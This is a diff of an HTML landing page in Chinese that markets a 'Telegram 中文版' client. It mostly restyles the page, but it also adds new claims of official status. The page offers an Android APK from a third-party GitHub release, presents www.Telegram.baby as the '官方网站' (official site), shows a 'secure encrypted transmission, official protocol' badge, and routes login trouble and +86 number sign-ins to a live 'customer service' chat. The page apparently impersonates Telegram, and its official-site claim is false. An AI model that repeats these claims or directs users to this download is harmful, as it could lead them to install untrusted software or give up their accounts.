@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram Client - 下载</title>
+    <title>Telegram 中文版 - 官方MTProto高速通道</title>
     <script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="79c0a886-96c2-4464-b49b-10802486a0db";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>
     <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-<script>LA.init({id:"LD7dS5n5uEExfngY",ck:"LD7dS5n5uEExfngY"})</script>
+    <script>LA.init({id:"LD7dS5n5uEExfngY",ck:"LD7dS5n5uEExfngY"})</script>
     <style>
         * {
             margin: 0;
@@ -16,213 +16,523 @@
 
         html {
             -webkit-text-size-adjust: 100%;
+            scroll-behavior: smooth;
+        }
+
+        :root {
+            --primary: #0088cc;
+            --primary-light: #34b5e8;
+            --primary-dark: #006699;
+            --accent: #00c6ff;
+            --accent-2: #0072ff;
+            --glass-bg: rgba(255, 255, 255, 0.08);
+            --glass-border: rgba(255, 255, 255, 0.15);
+            --glass-shadow: rgba(0, 0, 0, 0.3);
+            --text-primary: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.75);
+            --text-muted: rgba(255, 255, 255, 0.55);
+            --success: #00d084;
+            --warning: #ffa726;
         }
 
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: linear-gradient(135deg, #ff8a65 0%, #ff7043 50%, #f4511e 100%);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "PingFang SC", "Microsoft YaHei", sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
             min-height: 100vh;
             min-height: 100dvh;
             display: flex;
             justify-content: center;
-            padding: 16px;
-            padding-top: max(16px, env(safe-area-inset-top));
-            padding-bottom: max(16px, env(safe-area-inset-bottom));
-            padding-left: max(16px, env(safe-area-inset-left));
-            padding-right: max(16px, env(safe-area-inset-right));
+            align-items: center;
+            padding: 20px;
+            padding-top: max(20px, env(safe-area-inset-top));
+            padding-bottom: max(20px, env(safe-area-inset-bottom));
             overflow-y: auto;
             -webkit-overflow-scrolling: touch;
+            position: relative;
         }
 
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 24px 20px;
-            max-width: 500px;
+        /* 动态背景粒子 */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-height: calc(100dvh - 32px);
-            max-height: calc(100vh - 32px);
-            box-shadow: 0 20px 60px rgba(244, 81, 30, 0.25);
+            height: 100%;
+            overflow: hidden;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .bg-animation span {
+            position: absolute;
+            display: block;
+            width: 20px;
+            height: 20px;
+            background: rgba(0, 198, 255, 0.15);
+            border-radius: 50%;
+            animation: float-up 15s infinite linear;
+        }
+
+        .bg-animation span:nth-child(1) { left: 10%; width: 80px; height: 80px; animation-delay: 0s; animation-duration: 20s; }
+        .bg-animation span:nth-child(2) { left: 30%; width: 40px; height: 40px; animation-delay: 2s; animation-duration: 18s; background: rgba(0, 114, 255, 0.1); }
+        .bg-animation span:nth-child(3) { left: 50%; width: 100px; height: 100px; animation-delay: 4s; animation-duration: 22s; background: rgba(0, 198, 255, 0.08); }
+        .bg-animation span:nth-child(4) { left: 70%; width: 60px; height: 60px; animation-delay: 1s; animation-duration: 16s; background: rgba(52, 181, 232, 0.12); }
+        .bg-animation span:nth-child(5) { left: 85%; width: 50px; height: 50px; animation-delay: 3s; animation-duration: 19s; }
+        .bg-animation span:nth-child(6) { left: 20%; width: 30px; height: 30px; animation-delay: 5s; animation-duration: 17s; background: rgba(0, 114, 255, 0.15); }
+        .bg-animation span:nth-child(7) { left: 60%; width: 70px; height: 70px; animation-delay: 6s; animation-duration: 21s; }
+        .bg-animation span:nth-child(8) { left: 40%; width: 45px; height: 45px; animation-delay: 7s; animation-duration: 15s; background: rgba(0, 198, 255, 0.1); }
+
+        @keyframes float-up {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 0.5;
+            }
+            100% {
+                transform: translateY(-100vh) scale(1.5);
+                opacity: 0;
+            }
+        }
+
+        /* 主容器 - 玻璃拟态 */
+        .container {
+            position: relative;
+            z-index: 1;
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            border-radius: 24px;
+            padding: 40px 32px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 
+                0 25px 50px -12px var(--glass-shadow),
+                0 0 0 1px rgba(255, 255, 255, 0.05) inset;
             text-align: center;
             margin: auto;
-            overflow-y: auto;
-            scrollbar-width: thin;
+            overflow: hidden;
+            animation: fade-in-up 0.8s ease-out;
         }
 
-        .container::-webkit-scrollbar {
-            width: 4px;
+        @keyframes fade-in-up {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
-        .container::-webkit-scrollbar-track {
-            background: transparent;
+
+        /* 顶部光晕装饰 */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 198, 255, 0.08) 0%, transparent 70%);
+            pointer-events: none;
+            z-index: -1;
         }
-        .container::-webkit-scrollbar-thumb {
-            background: #ddd;
-            border-radius: 2px;
+
+        /* Logo区域 */
+        .logo-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 24px;
         }
 
         .logo {
-            width: 72px;
-            height: 72px;
-            margin: 16px auto 16px;
-            border-radius: 50%;
-            overflow: hidden;
-            background: linear-gradient(135deg, #ff8a65 0%, #ff7043 100%);
+            width: 88px;
+            height: 88px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
             display: flex;
             align-items: center;
             justify-content: center;
-            flex-shrink: 0;
+            position: relative;
+            z-index: 2;
+            box-shadow: 
+                0 10px 40px rgba(0, 114, 255, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+            animation: logo-float 3s ease-in-out infinite;
+        }
+
+        @keyframes logo-float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
         }
 
         .logo svg {
             width: 48px;
             height: 48px;
             fill: white;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
         }
 
+        /* Logo脉冲光环 */
+        .logo-pulse {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 88px;
+            height: 88px;
+            border-radius: 24px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
+            opacity: 0.4;
+            z-index: 1;
+            animation: pulse-ring 2s ease-out infinite;
+        }
+
+        .logo-pulse:nth-child(2) {
+            animation-delay: 0.5s;
+        }
+
+        @keyframes pulse-ring {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.4;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(1.6);
+                opacity: 0;
+            }
+        }
+
+        /* 标题 */
         h1 {
-            color: #333;
-            margin-bottom: 8px;
-            font-size: clamp(22px, 5vw, 28px);
+            color: var(--text-primary);
+            margin-bottom: 10px;
+            font-size: clamp(26px, 6vw, 34px);
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
         }
 
         .subtitle {
-            color: #666;
-            margin-bottom: 24px;
-            font-size: clamp(13px, 3.5vw, 15px);
-            line-height: 1.5;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+            font-size: clamp(14px, 3.5vw, 16px);
+            line-height: 1.6;
+            font-weight: 400;
         }
 
-        .features {
+        .subtitle strong {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* 特性卡片网格 */
+        .features-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+            margin: 28px 0;
             text-align: left;
-            margin: 20px 0;
-            padding: 16px;
-            background: #fff3e0;
-            border-radius: 12px;
         }
 
-        .features li {
-            list-style: none;
-            padding: 6px 0;
-            color: #555;
-            font-size: clamp(13px, 3.5vw, 15px);
-            line-height: 1.5;
+        .feature-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 16px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            transition: all 0.3s ease;
+            cursor: default;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 3px;
+            height: 100%;
+            background: linear-gradient(180deg, var(--accent) 0%, var(--accent-2) 100%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .feature-card:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.15);
+            transform: translateX(4px);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .feature-card:hover::before {
+            opacity: 1;
+        }
+
+        .feature-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, rgba(0, 198, 255, 0.2) 0%, rgba(0, 114, 255, 0.2) 100%);
             display: flex;
             align-items: center;
-            gap: 8px;
+            justify-content: center;
+            flex-shrink: 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .features li:before {
-            content: "✓";
-            color: #ff7043;
-            font-weight: bold;
-            flex-shrink: 0;
-            font-size: 14px;
-            width: 14px;
-            text-align: center;
-            line-height: 1;
+        .feature-icon svg {
+            width: 20px;
+            height: 20px;
+            stroke: var(--accent);
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .feature-content {
+            flex: 1;
+        }
+
+        .feature-title {
+            color: var(--text-primary);
+            font-size: clamp(14px, 3.5vw, 15px);
+            font-weight: 600;
+            margin-bottom: 3px;
+            line-height: 1.4;
+        }
+
+        .feature-desc {
+            color: var(--text-muted);
+            font-size: clamp(12px, 3.2vw, 13px);
+            line-height: 1.5;
+        }
+
+        /* 分隔线 */
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.15), transparent);
+            margin: 28px 0;
+        }
+
+        /* 下载按钮 - 发光效果 */
+        .download-section {
+            margin: 24px 0;
         }
 
         .download-btn {
-            display: inline-block;
-            background: linear-gradient(135deg, #ff8a65 0%, #ff7043 100%);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-2) 100%);
             color: white;
             text-decoration: none;
-            padding: 10px 42px;
-            border-radius: 30px;
+            padding: 14px 48px;
+            border-radius: 50px;
             font-size: clamp(16px, 4vw, 18px);
-            font-weight: bold;
-            margin: 8px 0 12px;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 4px 15px rgba(255, 112, 67, 0.35);
-            flex-shrink: 0;
+            font-weight: 700;
+            transition: all 0.3s ease;
+            box-shadow: 
+                0 4px 20px rgba(0, 114, 255, 0.4),
+                0 0 0 1px rgba(255, 255, 255, 0.1) inset,
+                0 0 30px rgba(0, 198, 255, 0.2);
+            position: relative;
+            overflow: hidden;
             -webkit-tap-highlight-color: transparent;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            max-width: 320px;
         }
 
-        .download-btn:active {
-            transform: scale(0.96);
+        .download-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .download-btn:hover::before {
+            left: 100%;
         }
 
         .download-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 112, 67, 0.5);
+            box-shadow: 
+                0 8px 30px rgba(0, 114, 255, 0.5),
+                0 0 0 1px rgba(255, 255, 255, 0.15) inset,
+                0 0 40px rgba(0, 198, 255, 0.3);
         }
 
+        .download-btn:active {
+            transform: scale(0.97);
+        }
+
+        .download-btn svg {
+            width: 22px;
+            height: 22px;
+            fill: currentColor;
+            animation: bounce-down 2s infinite;
+        }
+
+        @keyframes bounce-down {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(3px); }
+        }
+
+        /* iOS提示 - 精致卡片 */
         .ios-hint {
             display: inline-flex;
             align-items: center;
-            gap: 6px;
-            margin: 0 auto 12px;
-            padding: 8px 14px;
-            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
-            border: 1px solid #ffcc80;
-            border-radius: 20px;
-            font-size: clamp(12px, 3.2vw, 13px);
-            color: #e64a19;
+            justify-content: center;
+            gap: 10px;
+            margin: 16px auto 0;
+            padding: 12px 20px;
+            background: linear-gradient(135deg, rgba(255, 167, 38, 0.15) 0%, rgba(255, 167, 38, 0.05) 100%);
+            border: 1px solid rgba(255, 167, 38, 0.25);
+            border-radius: 16px;
+            font-size: clamp(13px, 3.3vw, 14px);
+            color: #ffb74d;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
             -webkit-tap-highlight-color: transparent;
-            max-width: 90%;
+            width: 100%;
+            max-width: 320px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .ios-hint::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 167, 38, 0.1) 0%, transparent 70%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .ios-hint:hover {
+            background: linear-gradient(135deg, rgba(255, 167, 38, 0.25) 0%, rgba(255, 167, 38, 0.1) 100%);
+            border-color: rgba(255, 167, 38, 0.4);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 15px rgba(255, 167, 38, 0.15);
+        }
+
+        .ios-hint:hover::after {
+            opacity: 1;
         }
 
         .ios-hint:active {
             transform: scale(0.98);
-            background: linear-gradient(135deg, #ffe0b2 0%, #ffcc80 100%);
         }
 
         .ios-hint svg {
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             flex-shrink: 0;
-            color: #e64a19;
+            stroke: #ffb74d;
+            fill: none;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
         }
 
         .ios-hint .arrow {
-            margin-left: 2px;
-            font-size: 11px;
-            color: #ff7043;
+            margin-left: 4px;
+            font-size: 14px;
+            transition: transform 0.3s ease;
         }
 
-        /* 网站地址 + 复制按钮样式 */
+        .ios-hint:hover .arrow {
+            transform: translateX(4px);
+        }
+
+        /* 网站链接区域 */
+        .site-link-section {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .site-link-label {
+            color: var(--text-muted);
+            font-size: 12px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
         .site-link-box {
             display: inline-flex;
             align-items: center;
-            gap: 8px;
-            margin-top: 12px;
+            gap: 10px;
             padding: 10px 16px;
-            background: #fff3e0;
-            border-radius: 12px;
-            border: 1px solid #ffcc80;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            transition: all 0.3s ease;
+        }
+
+        .site-link-box:hover {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.2);
         }
 
         .site-url {
-            color: #e64a19;
-            font-size: clamp(13px, 3.5vw, 15px);
-            font-weight: 500;
+            color: var(--accent);
+            font-size: clamp(14px, 3.5vw, 15px);
+            font-weight: 600;
             text-decoration: none;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.5px;
+            transition: color 0.3s ease;
             -webkit-tap-highlight-color: transparent;
         }
 
-        .site-url:active {
-            opacity: 0.7;
+        .site-url:hover {
+            color: var(--primary-light);
         }
 
         .copy-btn {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 4px;
-            padding: 6px 12px;
-            background: linear-gradient(135deg, #ff8a65 0%, #ff7043 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
+            gap: 5px;
+            padding: 7px 14px;
+            background: linear-gradient(135deg, rgba(0, 198, 255, 0.2) 0%, rgba(0, 114, 255, 0.2) 100%);
+            color: var(--accent);
+            border: 1px solid rgba(0, 198, 255, 0.3);
+            border-radius: 10px;
             font-size: 12px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all 0.3s ease;
             -webkit-tap-highlight-color: transparent;
             white-space: nowrap;
+        }
+
+        .copy-btn:hover {
+            background: linear-gradient(135deg, rgba(0, 198, 255, 0.3) 0%, rgba(0, 114, 255, 0.3) 100%);
+            border-color: rgba(0, 198, 255, 0.5);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 114, 255, 0.2);
         }
 
         .copy-btn:active {
@@ -236,107 +546,293 @@
         }
 
         .copy-btn.copied {
-            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
+            background: linear-gradient(135deg, rgba(0, 208, 132, 0.2) 0%, rgba(0, 200, 83, 0.2) 100%);
+            color: var(--success);
+            border-color: rgba(0, 208, 132, 0.4);
+        }
+
+        /* 底部安全提示 */
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            margin-top: 20px;
+            padding: 8px 16px;
+            background: rgba(0, 208, 132, 0.1);
+            border: 1px solid rgba(0, 208, 132, 0.2);
+            border-radius: 20px;
+            color: var(--success);
+            font-size: 12px;
+            font-weight: 500;
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: currentColor;
+        }
+
+        /* 响应式优化 */
+        @media (min-width: 768px) {
+            .container {
+                padding: 48px 40px;
+                border-radius: 28px;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 14px;
+            }
+
+            .feature-card {
+                padding: 18px;
+            }
+
+            .logo {
+                width: 96px;
+                height: 96px;
+            }
+
+            .logo svg {
+                width: 52px;
+                height: 52px;
+            }
         }
 
         @media (max-width: 375px) {
             body {
                 padding: 12px;
             }
+
             .container {
-                padding: 20px 16px;
-                border-radius: 16px;
+                padding: 28px 20px;
+                border-radius: 20px;
             }
+
             .logo {
-                width: 64px;
-                height: 64px;
+                width: 72px;
+                height: 72px;
+                border-radius: 20px;
             }
+
             .logo svg {
                 width: 40px;
                 height: 40px;
             }
-            .features {
-                padding: 12px;
-                margin: 16px 0;
+
+            .feature-card {
+                padding: 14px;
+                gap: 12px;
             }
-            .ios-hint {
-                padding: 6px 12px;
+
+            .feature-icon {
+                width: 36px;
+                height: 36px;
+                border-radius: 10px;
             }
-            .site-link-box {
-                padding: 8px 12px;
-                gap: 6px;
-            }
-            .copy-btn {
-                padding: 5px 10px;
-                font-size: 11px;
+
+            .feature-icon svg {
+                width: 18px;
+                height: 18px;
             }
         }
 
-        @media (max-height: 500px) and (orientation: landscape) {
+        @media (max-height: 600px) and (orientation: landscape) {
+            body {
+                align-items: flex-start;
+                padding-top: 12px;
+                padding-bottom: 12px;
+            }
+
             .container {
+                display: grid;
+                grid-template-columns: auto 1fr;
+                gap: 24px;
+                text-align: left;
+                max-width: 720px;
+                padding: 24px;
+            }
+
+            .logo-wrapper {
+                margin-bottom: 0;
+                align-self: center;
+            }
+
+            .content-wrapper {
+                display: flex;
+                flex-direction: column;
+            }
+
+            h1, .subtitle {
+                text-align: left;
+            }
+
+            .features-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 10px;
+                margin: 16px 0;
+            }
+
+            .feature-card {
+                padding: 12px;
+            }
+
+            .download-section {
                 display: flex;
                 flex-direction: row;
+                gap: 12px;
                 align-items: center;
-                text-align: left;
-                gap: 20px;
-                padding: 16px;
+                margin: 16px 0 0 0;
             }
-            .logo {
+
+            .download-btn, .ios-hint {
+                width: auto;
                 margin: 0;
-                flex-shrink: 0;
             }
-            .content-wrapper {
-                flex: 1;
+
+            .site-link-section {
+                margin-top: 16px;
+                padding-top: 16px;
             }
-            .features {
-                margin: 12px 0;
+
+            .divider {
+                display: none;
             }
-            .ios-hint {
-                margin: 0 0 8px 0;
-            }
-            .site-link-box {
-                margin-top: 8px;
-            }
+        }
+
+        /* 滚动条美化 */
+        .container::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .container::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .container::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 2px;
+        }
+
+        /* 加载动画延迟 */
+        .feature-card:nth-child(1) { animation: fade-in-up 0.6s ease-out 0.1s both; }
+        .feature-card:nth-child(2) { animation: fade-in-up 0.6s ease-out 0.2s both; }
+        .feature-card:nth-child(3) { animation: fade-in-up 0.6s ease-out 0.3s both; }
+        .feature-card:nth-child(4) { animation: fade-in-up 0.6s ease-out 0.4s both; }
+        .feature-card:nth-child(5) { animation: fade-in-up 0.6s ease-out 0.5s both; }
+
+        .download-section {
+            animation: fade-in-up 0.6s ease-out 0.6s both;
+        }
+
+        .site-link-section {
+            animation: fade-in-up 0.6s ease-out 0.7s both;
         }
     </style>
 </head>
 <body>
+    <!-- 动态背景 -->
+    <div class="bg-animation">
+        <span></span><span></span><span></span><span></span>
+        <span></span><span></span><span></span><span></span>
+    </div>
+
     <div class="container">
-        <div class="logo">
-            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
-            </svg>
+        <div class="logo-wrapper">
+            <div class="logo-pulse"></div>
+            <div class="logo-pulse"></div>
+            <div class="logo">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
+                </svg>
+            </div>
         </div>
 
         <div class="content-wrapper">
-            <h1>Telegram Client</h1>
-            <p class="subtitle">内置官方MTProto高速通道，即开即用。</p>
+            <h1>Telegram 中文版</h1>
+            <p class="subtitle">内置<strong>官方MTProto</strong>高速通道，即开即用</p>
 
-            <ul class="features">
-                <li>无需魔法配置，安装即用。</li>
-                <li>完整中文界面。</li>
-                <li>解决收不到验证码、无法登陆等问题。</li>
-            </ul>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <div class="feature-title">无需魔法配置</div>
+                        <div class="feature-desc">更安全、更稳定、更高速</div>
+                    </div>
+                </div>
 
-            <a href="https://github.com/tgclient/telegram-client/releases/download/V12.5.1/android.apk" class="download-btn">安卓立即下载</a>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <div class="feature-title">完整中文界面</div>
+                        <div class="feature-desc">播放视频不卡顿，体验流畅</div>
+                    </div>
+                </div>
 
-            <!-- iOS 用户提示 -->
-            <div class="ios-hint" onclick="$crisp.push(['do', 'chat:open'])">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
-                    <line x1="12" y1="18" x2="12.01" y2="18"></line>
-                </svg>
-                <span>iOS 请联系右下角客服协助登录</span>
-                <span class="arrow">›</span>
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <div class="feature-title">实时通知提示音</div>
+                        <div class="feature-desc">任何信息均无遗漏，及时提醒</div>
+                    </div>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <div class="feature-title">+86号码也可登录</div>
+                        <div class="feature-desc">请联系右下角客服协助</div>
+                    </div>
+                </div>
+
+                <div class="feature-card" style="grid-column: 1 / -1;">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                    </div>
+                    <div class="feature-content">
+                        <div class="feature-title">解决登录难题</div>
+                        <div class="feature-desc">收不到验证码、无法登陆等问题一键解决</div>
+                    </div>
+                </div>
             </div>
 
-            <!-- 网站地址 + 复制按钮 -->
-            <div class="site-link-box">
-                <a href="https://www.Telegram.baby" class="site-url" target="_blank">www.Telegram.baby</a>
-                <button class="copy-btn" onclick="copyUrl(this)">
-                    <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
-                    复制
-                </button>
+            <div class="divider"></div>
+
+            <div class="download-section">
+                <a href="https://github.com/tgclient/telegram-client/releases/download/V12.5.1/android.apk" class="download-btn">
+                    <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                    安卓立即下载
+                </a>
+
+                <div class="ios-hint" onclick="$crisp.push(['do', 'chat:open'])">
+                    <svg viewBox="0 0 24 24"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                    <span>iOS 请联系右下角客服协助登录</span>
+                    <span class="arrow">→</span>
+                </div>
+            </div>
+
+            <div class="site-link-section">
+                <div class="site-link-label">官方网站</div>
+                <div class="site-link-box">
+                    <a href="https://www.Telegram.baby" class="site-url" target="_blank">www.Telegram.baby</a>
+                    <button class="copy-btn" onclick="copyUrl(this)">
+                        <svg viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+                        复制
+                    </button>
+                </div>
+            </div>
+
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                安全加密传输 · 官方协议支持
             </div>
         </div>
     </div>
@@ -345,20 +841,20 @@
         // 复制网站地址
         function copyUrl(btn) {
             const url = 'www.Telegram.baby';
-            const originalText = btn.innerHTML;
+            const originalHTML = btn.innerHTML;
 
             if (navigator.clipboard && navigator.clipboard.writeText) {
                 navigator.clipboard.writeText(url).then(function() {
-                    showCopied(btn);
+                    showCopied(btn, originalHTML);
                 }).catch(function() {
-                    fallbackCopy(url, btn);
+                    fallbackCopy(url, btn, originalHTML);
                 });
             } else {
-                fallbackCopy(url, btn);
+                fallbackCopy(url, btn, originalHTML);
             }
         }
 
-        function fallbackCopy(text, btn) {
+        function fallbackCopy(text, btn, originalHTML) {
             const textarea = document.createElement('textarea');
             textarea.value = text;
             textarea.style.position = 'fixed';
@@ -368,11 +864,11 @@
 
             try {
                 document.execCommand('copy');
-                showCopied(btn);
+                showCopied(btn, originalHTML);
             } catch (err) {
-                btn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>失败';
+                btn.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>失败';
                 setTimeout(function() {
-                    btn.innerHTML = originalText;
+                    btn.innerHTML = originalHTML;
                     btn.classList.remove('copied');
                 }, 2000);
             }
@@ -380,8 +876,7 @@
             document.body.removeChild(textarea);
         }
 
-        function showCopied(btn) {
-            const originalHTML = btn.innerHTML;
+        function showCopied(btn, originalHTML) {
             btn.classList.add('copied');
